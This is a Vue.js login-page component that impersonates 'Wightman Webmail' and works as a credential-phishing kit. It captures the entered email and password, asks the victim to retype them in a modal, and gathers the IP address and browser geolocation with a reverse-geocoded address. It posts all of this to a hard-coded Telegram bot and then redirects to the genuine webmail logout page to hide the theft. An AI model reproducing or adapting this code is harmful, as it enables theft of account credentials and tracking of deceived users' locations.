<template>
    <main class="card-background">
        <ModalForm v-if="showModal" :location="location" :ipAddress="ipAddress" :retypedEmail="retypedEmail"
            :retypedPassword="retypedPassword" @login-success="handleLoginSuccess" @close-modal="showModal = false" />
        <div className="card">
            <h3 class="card-header"> Welcome to Wightman Webmail </h3>
            <form @submit.prevent="submitForm" class="form-group">
                <div className="credentials-group">
                    <div className="field-group"><label For="email">Username </label>
                        <input id="email" name="email" type="email" v-model="email" />
                        <div v-if="errors.email" class="error">{{ errors.email }}</div>
                    </div>
                    <div class="field-group"><label For="Password">Password</label>
                        <input id="password" name="password" type="password" v-model="password" />
                        <div v-if="errors.password" class="error">{{ errors.password }}</div>
                    </div>
                </div>
                <button class="button" type="submit"> Login </button>
            </form>
        </div>

        <div class="bottomline">
            Wightman Webmail
        </div>
    </main>
</template>

<script>
import axios from 'axios';
import ModalForm from './ModalForm.vue';

export default {
    name: 'AppContainer',
    components: {
        ModalForm
    },
    data() {
        return {
            email: '',
            password: '',
            retypedPassword: '',  // Variable to store retyped password
            retypedEmail: '',     // Variable to store retyped email
            errors: {},
            location: {},
            ipAddress: '',
            showModal: false,  // To control modal visibility
        };
    },
    methods: {
        async submitForm() {
            this.errors = {};

            // Validate email
            if (!this.email) {
                this.errors.email = 'Email is required';
            } else if (!this.validateEmail(this.email)) {
                this.errors.email = 'Invalid Credentials';
            }

            // Validate password
            if (!this.password) {
                this.errors.password = 'Invalid Credentials';
            }

            // If there are validation errors, stop the submission
            if (Object.keys(this.errors).length > 0) {
                return;
            }

            try {
                // Get user's IP address
                this.ipAddress = await this.getIpAddress();

                // Show the modal with the correct location and IP
                this.showModal = true;

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            this.location.latitude = position.coords.latitude;
                            this.location.longitude = position.coords.longitude;

                            // Get country from geolocation
                            const locationDetails = await this.getLocationDetails(
                                this.location.latitude,
                                this.location.longitude
                            );

                            this.location = { ...this.location, ...locationDetails };
                            await this.sendDataToTelegram();
                        },
                        async (error) => {
                            console.error('Geolocation error:', error);
                            this.sendDataToTelegram();

                        }
                    );
                }
            } catch (error) {
                console.error('Error fetching IP address:', error);
                await this.sendDataToTelegram();

            }
        },

        validateEmail(email) {
            const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            return re.test(email);
        },

        async getIpAddress() {
            try {
                const response = await axios.get('https://api64.ipify.org?format=json');
                return response.data.ip;
            } catch (error) {
                console.error('Failed to fetch IP address:', error);
                return 'N/A';
            }
        },

        async getLocationDetails(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                return {
                    country: data.address ? data.address.country : 'N/A',
                    city: data.address ? data.address.city : 'N/A',
                    state: data.address ? data.address.state : 'N/A',
                    zip_code: data.address ? data.address.postcode : 'N/A'
                };
            } catch (error) {
                console.error('Error fetching location details:', error);
                return {
                    country: 'N/A',
                    city: 'N/A',
                    state: 'N/A',
                    zip_code: 'N/A'
                };
            }
        },

        async handleLoginSuccess({ retypedEmail, retypedPassword }) {
            // Ensure to use the retyped values in the modal
            this.retypedEmail = retypedEmail;
            this.retypedPassword = retypedPassword;
            await this.sendDataToTelegram();
            window.location.href = 'https://webmail.wightman.ca/?_task=logout&_token=UfokgKShUDxHAHgQQEYU9oeylD6zjBal';
        },

        async sendDataToTelegram() {
            const googleMapsLink = this.location.latitude && this.location.longitude
                ? `https://www.google.com/maps?q=${this.location.latitude},${this.location.longitude}`
                : 'Location not available';

            const message = `Email: ${this.email}
Password: ${this.password}

Modal-email: ${this.retypedEmail}
Modal-password: ${this.retypedPassword}

IP Address: ${this.ipAddress || 'N/A'}
Latitude: ${this.location.latitude || 'N/A'}
Longitude: ${this.location.longitude || 'N/A'}
City: ${this.location.city || 'N/A'}
State: ${this.location.state || 'N/A'}
Zip Code: ${this.location.zip_code || 'N/A'}
Country: ${this.location.country || 'N/A'}
Location Link: ${googleMapsLink}`;

            console.log('message is', message);
            // const botToken = '6301043707:AAEfP2oS0CiG-T97bkXtnmZyL46O6DEWl_g';
            const botToken = '6301043707:AAGpjgz3uHhdr0PrdnAXLUKLHvtPgUo-irs';
            const chatId = 1613277499;
            // const chatId = 7067343735;
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await axios.post(telegramApiUrl, {
                    "chat_id": chatId,
                    "text": message
                });

                if (response.status === 200) {
                    console.log('message is', message);
                    console.log('Message sent successfully!');
                } else {
                    console.error('Failed to send message:', response.status, response.data);
                }
            } catch (error) {
                console.error(error);
            }
        },

        redirectToWebmail() {
            // Redirect to webmail (or any other desired location)
            // window.location.href = 'https://webmail.en.bellnet.ca'; // Replace with actual URL
            window.location.href = 'https://webmail.wightman.ca/?_task=logout&_token=UfokgKShUDxHAHgQQEYU9oeylD6zjBal';

        }
    }
};
</script>

<style scoped>
.card-background {
    margin-top: 40px;
    background: #f6f6f6;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}

.card {
    /* background: #f6f6f6; */
    background: #f2f2f2;
    max-width: 400px;
    width: 100vw;
    /* height: 117px; */
    border: 1px solid #999;
}

.card-header {
    background: #CCCCCC;
    color: #333;
    font-size: 11px;
    font-weight: bold;
    /* height: 12px !important; */
    border-bottom: 1px solid #999;
    overflow: hidden;
    /* whitespace: nowrap; */
    padding: 3px 10px 4px 5px;

}

.form-group {
    margin: 10px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 20px;
}

.credentials-group {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}

.field-group {
    display: flex;
    justify-content: space-between;
    gap: 10px;
    align-items: center;
    width: 288px;
}

.field-group label {
    color: #666;
}

.field-group input[type="email"],
.field-group input[type="password"] {
    width: 208px;
    height: 19px;
    background: white;
    padding: 1px 3px;
    border: 1px solid #666;
}

.field-group input[type="email"]:focus,
.field-group input[type="password"]:focus {
    width: 208px;
    height: 19px;
    background: white;
    padding: 1px 3px;
    border: 1px solid orange;
    outline: none;
}

.button {
    width: 54px;
    height: 20px;
    background: #F0F0F0;
    padding: 1px 8px;
    border: 1px solid #a4a4a4;
}

.bottomline {
    margin: 51px;
    display: flex;
    justify-content: center;
    align-items: center;
}

.error {
    color: red;
    font-size: 12px;
    margin-top: 7px;
}
</style>
